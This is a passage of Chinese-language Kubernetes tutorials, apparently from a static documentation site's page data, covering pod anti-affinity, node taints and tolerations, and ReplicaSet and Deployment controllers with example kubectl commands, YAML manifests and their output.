不在一个区域中的功能。\n\n它的配置方式和选项跟 podaffinty 是一样的，这里不再做详细解释，直接做一个测试案例。\n\n1）继续使用上个案例中目标 pod\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nname                     ready   status    restarts   age     ip            node    labels\npod-podaffinity-required 1/1     running   0          3m29s   10.244.1.38   node1   <none>     \npod-podaffinity-target   1/1     running   0          9m25s   10.244.1.37   node1   podenv=pro\n\n\n1\n2\n3\n4\n\n\n2）创建 pod-podantiaffinity-required.yaml，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-podantiaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    podantiaffinity: #设置pod亲和性\n      requiredduringschedulingignoredduringexecution: # 硬限制\n      - labelselector:\n          matchexpressions: # 匹配podenv的值在["pro"]中的标签\n          - key: podenv\n            operator: in\n            values: ["pro"]\n        topologykey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n上面配置表达的意思是：新 pod 必须要与拥有标签 nodeenv=pro 的 pod 不在同一 node 上，运行测试一下。\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-podantiaffinity-required.yaml\npod/pod-podantiaffinity-required created\n\n# 查看pod\n# 发现调度到了node2上\n[root@k8s-master01 ~]# kubectl get pods pod-podantiaffinity-required -n dev -o wide\nname                           ready   status    restarts   age   ip            node   .. \npod-podantiaffinity-required   1/1     running   0          30s   10.244.1.96   node2  ..\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 污点和容忍\n\n污点（taints）\n\n前面的调度方式都是站在 pod 的角度上，通过在 pod 上添加属性，来确定 pod 是否要调度到指定的 node 上，其实我们也可以站在 node 的角度上，通过在 node 上添加污点属性，来决定是否允许 pod 调度过来。\n\nnode 被设置上污点之后就和 pod 之间存在了一种相斥的关系，进而拒绝 pod 调度进来，甚至可以将已经存在的 pod 驱逐出去。\n\n污点的格式为： key=value:effect , key 和 value 是污点的标签，effect 描述污点的作用，支持如下三个选项：\n\n * prefernoschedule：kubernetes 将尽量避免把 pod 调度到具有该污点的 node 上，除非没有其他节点可调度\n * noschedule：kubernetes 将不会把 pod 调度到具有该污点的 node 上，但不会影响当前 node 上已存在的 pod\n * noexecute：kubernetes 将不会把 pod 调度到具有该污点的 node 上，同时也会将 node 上已存在的 pod 驱离\n\n\n\n使用 kubectl 设置和去除污点的命令示例如下：\n\n# 设置污点\nkubectl taint nodes 节点名称 key=value:effect\n\n# 去除污点\nkubectl taint nodes 节点名称 key:effect-\n\n# 去除所有污点\nkubectl taint nodes 节点名称 key-\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n接下来，演示下污点的效果：\n\n 1. 准备节点 node1（为了演示效果更加明显，暂时停止 node2 节点）\n 2. 为 node1 节点设置一个污点: tag=heima:prefernoschedule ；然后创建 pod1 (pod1 可以)\n 3. 修改为 node1 节点设置一个污点: tag=heima:noschedule ；然后创建 pod2 (pod1 正常 pod2 失败)\n 4. 修改为 node1 节点设置一个污点: tag=heima:noexecute ；然后创建 pod3 (3 个 pod 都失败)\n\n# 为node1设置污点(prefernoschedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:prefernoschedule\n\n# 创建pod1\n[root@k8s-master01 ~]# kubectl run taint1 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname                      ready   status    restarts   age     ip           node   \ntaint1-7665f7fd85-574h4   1/1     running   0          2m24s   10.244.1.59   node1    \n\n# 为node1设置污点(取消prefernoschedule，设置noschedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:prefernoschedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:noschedule\n\n# 创建pod2\n[root@k8s-master01 ~]# kubectl run taint2 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods taint2 -n dev -o wide\nname                      ready   status    restarts   age     ip            node\ntaint1-7665f7fd85-574h4   1/1     running   0          2m24s   10.244.1.59   node1 \ntaint2-544694789-6zmlf    0/1     pending   0          21s     <none>        <none>   \n\n# 为node1设置污点(取消noschedule，设置noexecute)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:noschedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:noexecute\n\n# 创建pod3\n[root@k8s-master01 ~]# kubectl run taint3 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname                      ready   status    restarts   age   ip       node     nominated \ntaint1-7665f7fd85-htkmp   0/1     pending   0          35s   <none>   <none>   <none>    \ntaint2-544694789-bn7wb    0/1     pending   0          35s   <none>   <none>   <none>     \ntaint3-6d78dbd749-tktkq   0/1     pending   0          6s    <none>   <none>   <none>     \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n> 使用 kubeadm 搭建的集群，默认就会给 master 节点添加一个污点标记，所以 pod 就不会调度到 master 节点上.\n\n容忍（toleration）\n\n上面介绍了污点的作用，我们可以在 node 上添加污点用于拒绝 pod 调度上来，但是如果就是想将一个 pod 调度到一个有污点的 node 上去，这时候应该怎么做呢？这就要使用到容忍。\n\n\n\n> 污点就是拒绝，容忍就是忽略，node 通过污点拒绝 pod 调度上去，pod 通过容忍忽略拒绝\n\n下面先通过一个案例看下效果：\n\n 1. 上一小节，已经在 node1 节点上打上了 noexecute 的污点，此时 pod 是调度不上去的\n 2. 本小节，可以通过给 pod 添加容忍，然后将其调度上去\n\n创建 pod-toleration.yaml, 内容如下\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-toleration\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  tolerations:      # 添加容忍\n  - key: "tag"        # 要容忍的污点的key\n    operator: "equal" # 操作符\n    value: "heima"    # 容忍的污点的value\n    effect: "noexecute"   # 添加容忍的规则，这里必须和标记的污点规则相同\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 添加容忍之前的pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname             ready   status    restarts   age   ip       node     nominated \npod-toleration   0/1     pending   0          3s    <none>   <none>   <none>           \n\n# 添加容忍之后的pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname             ready   status    restarts   age   ip            node    nominated\npod-toleration   1/1     running   0          3s    10.244.1.62   node1   <none>        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n下面看一下容忍的详细配置:\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.tolerations\n......\nfields:\n   key       \n   value     \n   operator  \n   effect    \n   tolerationseconds  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * key 对应着要容忍的污点的键，空意味着匹配所有的键\n * value 对应着要容忍的污点的值\n * operator key-value 的运算符，支持 equal 和 exists（默认）\n * effect 对应污点的 effect，空意味着匹配所有影响\n * tolerationseconds 容忍时间，当 effect 为 noexecute 时生效，表示 pod 在 node 上的停留时间',charsets:{cjk:!0}},{title:"kubernetes(八) Pod 控制器详解",frontmatter:{title:"kubernetes(八) Pod 控制器详解",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/607",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/607.kubernetes(%E5%85%AB)%20Pod%20%E6%8E%A7%E5%88%B6%E5%99%A8%E8%AF%A6%E8%A7%A3.html",relativePath:"01.运维/60.Kubernetes/607.kubernetes(八) Pod 控制器详解.md",key:"v-43fb77b9",path:"/kubernetes/607/",headers:[{level:2,title:"Pod控制器介绍",slug:"pod控制器介绍",normalizedTitle:"pod 控制器介绍",charIndex:2},{level:2,title:"ReplicaSet(RS)",slug:"replicaset-rs",normalizedTitle:"replicaset(rs)",charIndex:788},{level:2,title:"Deployment(Deploy)",slug:"deployment-deploy",normalizedTitle:"deployment(deploy)",charIndex:6384},{level:2,title:"Horizontal Pod Autoscaler(HPA)",slug:"horizontal-pod-autoscaler-hpa",normalizedTitle:"horizontal pod autoscaler(hpa)",charIndex:19499},{level:2,title:"DaemonSet(DS)",slug:"daemonset-ds",normalizedTitle:"daemonset(ds)",charIndex:27271},{level:2,title:"Job",slug:"job",normalizedTitle:"job",charIndex:675},{level:2,title:"CronJob(CJ)",slug:"cronjob-cj",normalizedTitle:"cronjob(cj)",charIndex:33743}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"Pod控制器介绍 ReplicaSet(RS) Deployment(Deploy) Horizontal Pod Autoscaler(HPA) DaemonSet(DS) Job CronJob(CJ)",content:'# Pod 控制器介绍\n\nPod 是 kubernetes 的最小管理单元，在 kubernetes 中，按照 pod 的创建方式可以将其分为两类：\n\n * 自主式 pod：kubernetes 直接创建出来的 Pod，这种 pod 删除后就没有了，也不会重建\n * 控制器创建的 pod：kubernetes 通过控制器创建的 pod，这种 pod 删除了之后还会自动重建\n\n> 什么是Pod控制器\n> Pod 控制器是管理 pod 的中间层，使用 Pod 控制器之后，只需要告诉 Pod 控制器，想要多少个什么样的 Pod 就可以了，它会创建出满足条件的 Pod 并确保每一个 Pod 资源处于用户期望的目标状态。如果 Pod 资源在运行中出现故障，它会基于指定策略重新编排 Pod。\n\n在 kubernetes 中，有很多类型的 pod 控制器，每种都有自己的适合的场景，常见的有下面这些：\n\n * ReplicationController：比较原始的 pod 控制器，已经被废弃，由 ReplicaSet 替代\n * ReplicaSet：保证副本数量一直维持在期望值，并支持 pod 数量扩缩容，镜像版本升级\n * Deployment：通过控制 ReplicaSet 来控制 Pod，并支持滚动升级、回退版本\n * Horizontal Pod Autoscaler：可以根据集群负载自动水平调整 Pod 的数量，实现削峰填谷\n * DaemonSet：在集群中的指定 Node 上运行且仅运行一个副本，一般用于守护进程类的任务\n * Job：它创建出来的 pod 只要完成任务就立即退出，不需要重启或重建，用于执行一次性任务\n * Cronjob：它创建的 Pod 负责周期性任务控制，不需要持续后台运行\n * StatefulSet：管理有状态应用\n\n\n# ReplicaSet(RS)\n\nReplicaSet 的主要作用是保证一定数量的 pod 正常运行，它会持续监听这些 Pod 的运行状态，一旦 Pod 发生故障，就会重启或重建。同时它还支持对 pod 数量的扩缩容和镜像版本的升降级。\n\n\n\nReplicaSet 的资源清单文件：\n\napiVersion: apps/v1 # 版本号\nkind: ReplicaSet # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: rs\nspec: # 详情描述\n  replicas: 3 # 副本数量\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchLabels:      # Labels匹配规则\n      app: nginx-pod\n    matchExpressions: # Expressions匹配规则\n      - {key: app, operator: In, values: [nginx-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n在这里面，需要新了解的配置项就是 spec 下面几个选项：\n\n * replicas：指定副本数量，其实就是当前 rs 创建出来的 pod 的数量，默认为 1\n * selector：选择器，它的作用是建立 pod 控制器和 pod 之间的关联关系，采用的 Label Selector 机制\n   在 pod 模板上定义 label，在控制器上定义选择器，就可以表明当前控制器能管理哪些 pod 了\n * template：模板，就是当前控制器创建 pod 所使用的模板板，里面其实就是前一章学过的 pod 的定义\n\n创建 ReplicaSet\n创建 pc-replicaset.yaml 文件，内容如下：\n\napiVersion: apps/v1\nkind: ReplicaSet   \nmetadata:\n  name: pc-replicaset\n  namespace: dev\nspec:\n  replicas: 3\n  selector: \n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 创建rs\n[root@k8s-master01 ~]# kubectl create -f pc-replicaset.yaml\nreplicaset.apps/pc-replicaset created\n\n# 查看rs\n# DESIRED:期望副本数量  \n# CURRENT:当前副本数量  \n# READY:已经准备好提供服务的副本数量\n[root@k8s-master01 ~]# kubectl get rs pc-replicaset -n dev -o wide\nNAME          DESIRED   CURRENT READY AGE   CONTAINERS   IMAGES             SELECTOR\npc-replicaset 3         3       3     22s   nginx        nginx:1.17.1       app=nginx-pod\n\n# 查看当前控制器创建出来的pod\n# 这里发现控制器创建出来的pod的名称是在控制器名称后面拼接了-xxxxx随机码\n[root@k8s-master01 ~]# kubectl get pod -n dev\nNAME                          READY   STATUS    RESTARTS   AGE\npc-replicaset-6vmvt   1/1     Running   0          54s\npc-replicaset-fmb8f   1/1     Running   0          54s\npc-replicaset-snrk2   1/1     Running   0          54s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n扩缩容\n\n# 编辑rs的副本数量，修改spec:replicas: 6即可\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                          READY   STATUS    RESTARTS   AGE\npc-replicaset-6vmvt   1/1     Running   0          114m\npc-replicaset-cftnp   1/1     Running   0          10s\npc-replicaset-fjlm6   1/1     Running   0          10s\npc-replicaset-fmb8f   1/1     Running   0          114m\npc-replicaset-s2whj   1/1     Running   0          10s\npc-replicaset-snrk2   1/1     Running   0          114m\n\n# 当然也可以直接使用命令实现\n# 使用scale命令实现扩缩容， 后面--replicas=n直接指定目标数量即可\n[root@k8s-master01 ~]# kubectl scale rs pc-replicaset --replicas=2 -n dev\nreplicaset.apps/pc-replicaset scaled\n\n# 命令运行完毕，立即查看，发现已经有4个开始准备退出了\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                       READY   STATUS        RESTARTS   AGE\npc-replicaset-6vmvt   0/1     Terminating   0          118m\npc-replicaset-cftnp   0/1     Terminating   0          4m17s\npc-replicaset-fjlm6   0/1     Terminating   0          4m17s\npc-replicaset-fmb8f   1/1     Running       0          118m\npc-replicaset-s2whj   0/1     Terminating   0          4m17s\npc-replicaset-snrk2   1/1     Running       0          118m\n\n#稍等片刻，就只剩下2个了\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                       READY   STATUS    RESTARTS   AGE\npc-replicaset-fmb8f   1/1     Running   0          119m\npc-replicaset-snrk2   1/1     Running   0          119m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n镜像升级\n\n# 编辑rs的容器镜像 - image: nginx:1.17.2\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# 再次查看，发现镜像版本已经变更了\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                DESIRED  CURRENT   READY   AGE    CONTAINERS   IMAGES        ...\npc-replicaset       2        2         2       140m   nginx         nginx:1.17.2  ...\n\n# 同样的道理，也可以使用命令完成这个工作\n# kubectl set image rs rs名称 容器=镜像版本 -n namespace\n[root@k8s-master01 ~]# kubectl set image rs pc-replicaset nginx=nginx:1.17.1  -n dev\nreplicaset.apps/pc-replicaset image updated\n\n# 再次查看，发现镜像版本已经变更了\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                 DESIRED  CURRENT   READY   AGE    CONTAINERS   IMAGES            ...\npc-replicaset        2        2         2       145m   nginx        nginx:1.17.1 ... \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n删除 ReplicaSet\n\n# 使用kubectl delete命令会删除此RS以及它管理的Pod\n# 在kubernetes删除RS前，会将RS的replicasclear调整为0，等待所有的Pod被删除后，在执行RS对象的删除\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pod -n dev -o wide\nNo resources found in dev namespace.\n\n# 如果希望仅仅删除RS对象（保留Pod），可以使用kubectl delete命令时添加--cascade=false选项（不推荐）。\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev --cascade=false\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                  READY   STATUS    RESTARTS   AGE\npc-replicaset-cl82j   1/1     Running   0          75s\npc-replicaset-dslhb   1/1     Running   0          75s\n\n# 也可以使用yaml直接删除(推荐)\n[root@k8s-master01 ~]# kubectl delete -f pc-replicaset.yaml\nreplicaset.apps "pc-replicaset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# Deployment(Deploy)\n\n为了更好的解决服务编排的问题，kubernetes 在 V1.2 版本开始，引入了 Deployment 控制器。值得一提的是，这种控制器并不直接管理 pod，而是通过管理 ReplicaSet 来简介管理 Pod，即：Deployment 管理 ReplicaSet，ReplicaSet 管理 Pod。所以 Deployment 比 ReplicaSet 功能更加强大。\n\n\n\nDeployment 主要功能有下面几个：\n\n * 支持 ReplicaSet 的所有功能\n * 支持发布的停止、继续\n * 支持滚动更新和回滚版本\n\nDeployment 的资源清单文件：\n\napiVersion: apps/v1 # 版本号\nkind: Deployment # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: deploy\nspec: # 详情描述\n  replicas: 3 # 副本数量\n  revisionHistoryLimit: 3 # 保留历史版本\n  paused: false # 暂停部署，默认是false\n  progressDeadlineSeconds: 600 # 部署超时时间（s），默认是600\n  strategy: # 策略\n    type: RollingUpdate # 滚动更新策略\n    rollingUpdate: # 滚动更新\n      maxSurge: 30% # 最大额外可以存在的副本数，可以为百分比，也可以为整数\n      maxUnavailable: 30% # 最大不可用状态的 Pod 的最大值，可以为百分比，也可以为整数\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchLabels:      # Labels匹配规则\n      app: nginx-pod\n    matchExpressions: # Expressions匹配规则\n      - {key: app, operator: In, values: [nginx-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n创建 deployment\n创建 pc-deployment.yaml，内容如下：\n\napiVersion: apps/v1\nkind: Deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 创建deployment\n[root@k8s-master01 ~]# kubectl create -f pc-deployment.yaml --record=true\ndeployment.apps/pc-deployment created\n\n# 查看deployment\n# UP-TO-DATE 最新版本的pod的数量\n# AVAILABLE  当前可用的pod的数量\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nNAME            READY   UP-TO-DATE   AVAILABLE   AGE\npc-deployment   3/3     3            3           15s\n\n# 查看rs\n# 发现rs的名称是在原来deployment的名字后面添加了一个10位数的随机串\n[root@k8s-master01 ~]# kubectl get rs -n dev\nNAME                       DESIRED   CURRENT   READY   AGE\npc-deployment-6696798b78   3         3         3       23s\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6696798b78-d2c8n   1/1     Running   0          107s\npc-deployment-6696798b78-smpvp   1/1     Running   0          107s\npc-deployment-6696798b78-wvjd8   1/1     Running   0          107s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n扩缩容\n\n# 变更副本数量为5个\n[root@k8s-master01 ~]# kubectl scale deploy pc-deployment --replicas=5  -n dev\ndeployment.apps/pc-deployment scaled\n\n# 查看deployment\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nNAME            READY   UP-TO-DATE   AVAILABLE   AGE\npc-deployment   5/5     5            5           2m\n\n# 查看pod\n[root@k8s-master01 ~]#  kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6696798b78-d2c8n   1/1     Running   0          4m19s\npc-deployment-6696798b78-jxmdq   1/1     Running   0          94s\npc-deployment-6696798b78-mktqv   1/1     Running   0          93s\npc-deployment-6696798b78-smpvp   1/1     Running   0          4m19s\npc-deployment-6696798b78-wvjd8   1/1     Running   0          4m19s\n\n# 编辑deployment的副本数量，修改spec:replicas: 4即可\n[root@k8s-master01 ~]# kubectl edit deploy pc-deployment -n dev\ndeployment.apps/pc-deployment edited\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6696798b78-d2c8n   1/1     Running   0          5m23s\npc-deployment-6696798b78-jxmdq   1/1     Running   0          2m38s\npc-deployment-6696798b78-smpvp   1/1     Running   0          5m23s\npc-deployment-6696798b78-wvjd8   1/1     Running   0          5m23s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n镜像更新\ndeployment 支持两种更新策略: 重建更新（删掉所有老版本得pod，然后重建新版本的pod） 和 滚动更新（默认）（不会一次性删除，先删一部分低版本，建立一部分新版本，以此类推，直到满足数量） , 可以通过 strategy 指定策略类型，支持两个属性:\n\nstrategy：指定新的Pod替换旧的Pod的策略， 支持两个属性：\n  type：指定策略类型，支持两种策略\n    Recreate：在创建出新的Pod之前会先杀掉所有已存在的Pod\n    RollingUpdate：滚动更新，就是杀死一部分，就启动一部分，在更新过程中，存在两个版本Pod\n  rollingUpdate：当type为RollingUpdate时生效，用于为RollingUpdate设置参数，支持两个属性：\n    maxUnavailable：用来指定在升级过程中不可用Pod的最大数量，默认为25%。\n    maxSurge： 用来指定在升级过程中可以超过期望的Pod的最大数量，默认为25%。\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n重建更新\n1. 编辑 pc-deployment.yaml, 在 spec 节点下添加更新策略\n\nspec:\n  strategy: # 策略\n    type: Recreate # 重建更新\n\n\n1\n2\n3\n\n\n2. 创建 deploy 进行验证\n\n# 变更镜像\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.2 -n dev\ndeployment.apps/pc-deployment image updated\n\n# 观察升级过程\n[root@k8s-master01 ~]#  kubectl get pods -n dev -w\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-5d89bdfbf9-65qcw   1/1     Running   0          31s\npc-deployment-5d89bdfbf9-w5nzv   1/1     Running   0          31s\npc-deployment-5d89bdfbf9-xpt7w   1/1     Running   0          31s\n\npc-deployment-5d89bdfbf9-xpt7w   1/1     Terminating   0          41s\npc-deployment-5d89bdfbf9-65qcw   1/1     Terminating   0          41s\npc-deployment-5d89bdfbf9-w5nzv   1/1     Terminating   0          41s\n\npc-deployment-675d469f8b-grn8z   0/1     Pending       0          0s\npc-deployment-675d469f8b-hbl4v   0/1     Pending       0          0s\npc-deployment-675d469f8b-67nz2   0/1     Pending       0          0s\n\npc-deployment-675d469f8b-grn8z   0/1     ContainerCreating   0          0s\npc-deployment-675d469f8b-hbl4v   0/1     ContainerCreating   0          0s\npc-deployment-675d469f8b-67nz2   0/1     ContainerCreating   0          0s\n\npc-deployment-675d469f8b-grn8z   1/1     Running             0          1s\npc-deployment-675d469f8b-67nz2   1/1     Running             0          1s\npc-deployment-675d469f8b-hbl4v   1/1     Running             0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n滚动更新\n1. 编辑 pc-deployment.yaml, 在 spec 节点下添加更新策略\n\nspec:\n  strategy: # 策略\n    type: RollingUpdate # 滚动更新策略\n    rollingUpdate:\n      maxSurge: 25% \n      maxUnavailable: 25%\n\n\n1\n2\n3\n4\n5\n6\n\n\n2. 创建 deploy 进行验证\n\n# 变更镜像\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.3 -n dev \ndeployment.apps/pc-deployment image updated\n\n# 观察升级过程\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME                           READY   STATUS    RESTARTS   AGE\npc-deployment-c848d767-8rbzt   1/1     Running   0          31m\npc-deployment-c848d767-h4p68   1/1     Running   0          31m\npc-deployment-c848d767-hlmz4   1/1     Running   0          31m\npc-deployment-c848d767-rrqcn   1/1     Running   0          31m\n\npc-deployment-966bf7f44-226rx   0/1     Pending             0          0s\npc-deployment-966bf7f44-226rx   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-226rx   1/1     Running             0          1s\npc-deployment-c848d767-h4p68    0/1     Terminating         0          34m\n\npc-deployment-966bf7f44-cnd44   0/1     Pending             0          0s\npc-deployment-966bf7f44-cnd44   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-cnd44   1/1     Running             0          2s\npc-deployment-c848d767-hlmz4    0/1     Terminating         0          34m\n\npc-deployment-966bf7f44-px48p   0/1     Pending             0          0s\npc-deployment-966bf7f44-px48p   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-px48p   1/1     Running             0          0s\npc-deployment-c848d767-8rbzt    0/1     Terminating         0          34m\n\npc-deployment-966bf7f44-dkmqp   0/1     Pending             0          0s\npc-deployment-966bf7f44-dkmqp   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-dkmqp   1/1     Running             0          2s\npc-deployment-c848d767-rrqcn    0/1     Terminating         0          34m\n\n# 至此，新版本的pod创建完毕，就版本的pod销毁完毕\n# 中间过程是滚动进行的，也就是边销毁边创建\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n滚动更新的过程：\n\n\n\n镜像更新中 rs 的变化，可以在创建镜像得时候加 --recode 参数，有助于记录创建过程等。\n\n# 查看rs,发现原来的rs的依旧存在，只是pod数量变为了0，而后又新产生了一个rs，pod数量为4\n# 其实这就是deployment能够进行版本回退的奥妙所在，后面会详细解释\n[root@k8s-master01 ~]# kubectl get rs -n dev\nNAME                       DESIRED   CURRENT   READY   AGE\npc-deployment-6696798b78   0         0         0       7m37s\npc-deployment-6696798b11   0         0         0       5m37s\npc-deployment-c848d76789   4         4         4       72s\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n版本回退\ndeployment 支持版本升级过程中的暂停、继续功能以及版本回退等诸多功能，下面具体来看.\n\nkubectl rollout： 版本升级相关功能，支持下面的选项：\n\n * status 显示当前升级状态\n * history 显示 升级历史记录\n * pause 暂停版本升级过程\n * resume 继续已经暂停的版本升级过程\n * restart 重启版本升级过程\n * undo 回滚到上一级版本（可以使用 --to-revision 回滚到指定版本）\n\n# 查看当前升级版本的状态\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev\ndeployment "pc-deployment" successfully rolled out\n\n# 查看升级历史记录\n[root@k8s-master01 ~]# kubectl rollout history deploy pc-deployment -n dev\ndeployment.apps/pc-deployment\nREVISION  CHANGE-CAUSE\n1         kubectl create --filename=pc-deployment.yaml --record=true\n2         kubectl create --filename=pc-deployment.yaml --record=true\n3         kubectl create --filename=pc-deployment.yaml --record=true\n# 可以发现有三次版本记录，说明完成过两次升级\n\n# 版本回滚\n# 这里直接使用--to-revision=1回滚到了1版本， 如果省略这个选项，就是回退到上个版本，就是2版本\n[root@k8s-master01 ~]# kubectl rollout undo deployment pc-deployment --to-revision=1 -n dev\ndeployment.apps/pc-deployment rolled back\n\n# 查看发现，通过nginx镜像版本可以发现到了第一版\n[root@k8s-master01 ~]# kubectl get deploy -n dev -o wide\nNAME            READY   UP-TO-DATE   AVAILABLE   AGE   CONTAINERS   IMAGES         \npc-deployment   4/4     4            4           74m   nginx        nginx:1.17.1   \n\n# 查看rs，发现第一个rs中有4个pod运行，后面两个版本的rs中pod为运行\n# 其实deployment之所以可是实现版本的回滚，就是通过记录下历史rs来实现的，\n# 一旦想回滚到哪个版本，只需要将当前版本pod数量降为0，然后将回滚版本的pod提升为目标数量就可以了\n[root@k8s-master01 ~]# kubectl get rs -n dev\nNAME                       DESIRED   CURRENT   READY   AGE\npc-deployment-6696798b78   4         4         4       78m\npc-deployment-966bf7f44    0         0         0       37m\npc-deployment-c848d767     0         0         0       